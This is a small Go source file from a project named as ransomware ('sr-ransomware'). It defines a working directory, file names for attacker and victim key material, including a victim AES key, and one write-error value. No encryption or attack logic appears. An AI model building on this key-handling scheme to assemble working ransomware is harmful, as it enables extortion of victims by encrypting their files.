package scheme

import "github.com/sug0/sr-ransomware/go/errors"

const pkg = "github.com/sug0/sr-ransomware/go/crypto/scheme"

const (
    workDir           = `.\justaflu`
    attackerPublicKey = "a.flu"
    victimPublicKey   = "b.flu"
    victimSecretKey   = "c.flu"
    victimAESKey      = "d.flu"
)

var (
    errNotFullWrite = errors.New(pkg, "failed to write all data")
)
